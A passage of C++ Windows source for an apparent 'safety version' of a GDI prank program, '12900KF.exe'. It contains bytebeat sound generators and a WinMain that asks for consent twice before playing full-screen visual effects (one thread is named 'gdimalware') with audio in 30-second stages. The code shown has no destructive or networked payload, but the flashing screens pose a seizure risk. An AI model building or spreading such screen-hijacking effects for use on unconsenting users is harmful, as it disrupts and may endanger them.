    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 567) * (t >> 8) ^ t & t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t >> 9 | t >> 11) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 8) % 7 * t * (~t >> 8 & 2) & 64) + ((t >> 9 | t >> 12) % 7 * t * (~t >> 9 & 2) & 64));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ (t >> 8) & t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(10 * (t >> 6 | t >> ((t >> 7) & (t >> 11))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (0x21CA52CA >> (t >> 9 & 30) & 12) + 
                                      t * (0xCACACACA >> (t >> 9 & 30) & 14) & t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + 
                                           (1 & t >> 14)) >> (3 & t >> (t & 2048 ? 2 : 10)) | 
                                      t >> (t & 16384 ? t & 4096 ? 10 : 2 : 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 12 & 12 ^ 2 | t >> 9 & 9) | t >> 2 | 30000 / (t % 4096 + 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8300, 8300, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8300 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t>>9^(t>>9)-1^1)%13*t);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8300, 8300, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8300 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 10 ^ t >> 12) % 5 * ((t >> 14 & 3 ^ t >> 15 & 1) + 1) * t % 100 + ((3 + (t >> 15 & 3) - (t >> 16 & 1)) / 3 * t % 98 & 67);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound18() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11325, 11325, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11325 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * (t + (t ^ t >> 8) ^ 5));
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound19() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16300, 16300, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16300 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * (3 + (4 + (t >> 14) % 2) * (t >> 10) % 7) & 128) * .5 * (.16 + (t >> 9) % 2));
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound20() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t<<4)^-(t>>4&1));
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound21() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8200, 8200, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8200 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ? 47 : 3) * (t >> 7));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound22() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t * 2 | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound23() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t * 4 | t >> 8));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound24() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22350, 22350, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22350 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 12 & 3 & t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound25() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>t%(t%2?t&32768?41:t&16384?51:61:34)&(t/9&t/7|t/5&t/3|t|t*3&t*5|t*7&t*9)>>4);
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound26() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t + t) >> 6) * tan((t + t) >> 6));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound27() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 3) * ((t >> 4) ^ (t >> 5)) & 255);
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound28() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 5) & (t * 8) ^ (t * 3));
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound29() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t % 2048) * (t % 2048)) >> 10);
        
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound30() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 255) & 0xFF);
		
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
) {
    srand((unsigned int)time(NULL));
    
    if (MessageBoxW(NULL, L"This is a safety version of 12900KF.exe, run?", L"12900KF-safety.exe by VietNamLover", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"It contains flashing lights and it not for epilepsy! If you really want to run this, press the yes button!", L"12900KF-safety.exe - LAST WARNING!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            Sleep(5000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);

            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);

            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);

            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);

            HANDLE thread5 = CreateThread(0, 0, thing5, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
            HANDLE thread5dot2 = CreateThread(0, 0, pacmans, 0, 0, 0);            
			HANDLE thread5dot3 = CreateThread(0, 0, textouts1, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            TerminateThread(thread5dot2, 0);
            CloseHandle(thread5dot2);
            TerminateThread(thread5dot3, 0);
            CloseHandle(thread5dot3);
            InvalidateRect(0, 0, 0);

            HANDLE thread6 = CreateThread(0, 0, Verity, 0, 0, 0);
            HANDLE thread6dot1 = CreateThread(0, 0, textouts, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            TerminateThread(thread6dot1, 0);
            CloseHandle(thread6dot1);
            InvalidateRect(0, 0, 0);

            HANDLE thread7 = CreateThread(0, 0, shader5, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);

            HANDLE thread8 = CreateThread(0, 0, Verityy, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);

            HANDLE thread9 = CreateThread(0, 0, Geometrydashh, 0, 0, 0);
            sound9();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);

			HANDLE thread10 = CreateThread(0, 0, dwnm, 0, 0, 0);
			sound10();
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);

            HANDLE thread11 = CreateThread(0, 0, i912900, 0, 0, 0);
            sound11();
            Sleep(30000);
            TerminateThread(thread11, 0);
            CloseHandle(thread11);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread12 = CreateThread(0, 0, jhjhh, 0, 0, 0);
            sound12(); 
			Sleep(30000);
            TerminateThread(thread12, 0); 
			CloseHandle(thread12);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread13 = CreateThread(0, 0, dfgvfh, 0, 0, 0);
            sound13(); 
			Sleep(30000);
            TerminateThread(thread13, 0); 
			CloseHandle(thread13);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread14 = CreateThread(0, 0, dsfv, 0, 0, 0);
            HANDLE thread14dot1 = CreateThread(0, 0, textouts2, 0, 0, 0);
            sound14(); 
		    Sleep(30000);
            TerminateThread(thread14, 0); 
		    CloseHandle(thread14);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread15 = CreateThread(0, 0, IntelCorei912900, 0, 0, 0);
            sound15();
            Sleep(30000);
            TerminateThread(thread15, 0); 
		    CloseHandle(thread15);
            TerminateThread(thread14dot1, 0); 
		    CloseHandle(thread14dot1);
            InvalidateRect(0, 0, 0);
            
        	HANDLE thread16 = CreateThread(0, 0, sfvdhvhsv, 0, 0, 0);
        	HANDLE thread16dot1 = CreateThread(0, 0, Verityisheree, 0, 0, 0);
        	sound16();
			Sleep(30000);
            TerminateThread(thread16, 0);
            CloseHandle(thread16);
            InvalidateRect(0, 0, 0);
            TerminateThread(thread16dot1, 0);
            CloseHandle(thread16dot1);
            InvalidateRect(0, 0, 0);

            HANDLE thread17 = CreateThread(0, 0, setpixel, 0, 0, 0);
            HANDLE thread17dot1 = CreateThread(0, 0, Verityishere, 0, 0, 0);
            sound17();
            Sleep(30000);
            TerminateThread(thread17, 0);
            CloseHandle(thread17);
            TerminateThread(thread17dot1, 0);
            CloseHandle(thread17dot1);
            InvalidateRect(0, 0, 0);
            
			HANDLE thread18 = CreateThread(0, 0, gdimalware, 0, 0, 0);
			sound18();
			Sleep(30000);
			TerminateThread(thread18, 0);
			CloseHandle(thread18);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread19 = CreateThread(0, 0, TransparentBlt1, 0, 0, 0);
			HANDLE thread19dot1 = CreateThread(0, 0, octagon, 0, 0, 0);
			sound19();
			Sleep(30000);
			TerminateThread(thread19, 0);
			CloseHandle(thread19);
			InvalidateRect(0, 0, 0);
		
			HANDLE thread20 = CreateThread(0, 0, blur1, 0, 0, 0);
			sound20();
			Sleep(30000);
			TerminateThread(thread20, 0);
			CloseHandle(thread20);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread21 = CreateThread(0, 0, KF, 0, 0, 0);
			sound21();
			Sleep(30000);
			TerminateThread(thread21, 0);
			CloseHandle(thread21);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread22 = CreateThread(0, 0, i9gen12, 0, 0, 0);
			HANDLE thread22dot1 = CreateThread(0, 0, IntelCorei9Gen12, 0, 0, 0);
			sound22();
			Sleep(30000);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread23 = CreateThread(0, 0, pentagon, 0, 0, 0);
			sound23();
			Sleep(30000);
			TerminateThread(thread22, 0);
			CloseHandle(thread22);
			TerminateThread(thread22dot1, 0);
			CloseHandle(thread22dot1);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread24 = CreateThread(0, 0, efjegjherf, 0, 0, 0);
			HANDLE thread24dot1 = CreateThread(0, 0, kldfvkj, 0, 0, 0);
			sound24();
			Sleep(30000);
			TerminateThread(thread24, 0);
			CloseHandle(thread24);
			TerminateThread(thread24dot1, 0);
			CloseHandle(thread24dot1);
			TerminateThread(thread23, 0);
			CloseHandle(thread23);
			InvalidateRect(0, 0, 0);
			
			HANDLE thread25 = CreateThread(0, 0, LTSC, 0, 0, 0);
			HANDLE thread25dot1 = CreateThread(0, 0, XdWindowsOS, 0, 0, 0);
			sound25();
			Sleep(30000);
			TerminateThread(thread25, 0);
			CloseHandle(thread25);
			TerminateThread(thread25dot1, 0);
			CloseHandle(thread25dot1);
			InvalidateRect(0, 0, 0);
			
            HANDLE thread26 = CreateThread(0, 0, idk, 0, 0, 0);
            HANDLE thread26dot1 = CreateThread(0, 0, pixelate, 0, 0, 0);
            sound26();
            Sleep(30000);
            TerminateThread(thread26, 0);
            CloseHandle(thread26);
            TerminateThread(thread26dot1, 0);
            CloseHandle(thread26dot1);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread27 = CreateThread(0, 0, IntelCorei912thGen, 0, 0, 0);
            sound27();
            Sleep(30000);
            TerminateThread(thread27, 0);
            CloseHandle(thread27);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread28 = CreateThread(0, 0, cnd, 0, 0, 0);
            sound28();
            Sleep(30000);
            TerminateThread(thread28, 0);
            CloseHandle(thread28);
            InvalidateRect(0, 0, 0);
            
            HANDLE thread29 = CreateThread(0, 0, cdvm, 0, 0, 0);
            sound29();
            Sleep(30000);
            TerminateThread(thread29, 0);
            CloseHandle(thread29);
            InvalidateRect(0, 0, 0);
            
			HANDLE thread30 = CreateThread(0, 0, last, 0, 0, 0);
			sound30();
			Sleep(30000);
            TerminateThread(thread30, 0);
            CloseHandle(thread30);
            InvalidateRect(0, 0, 0);
        }
    }    
    return 0;
}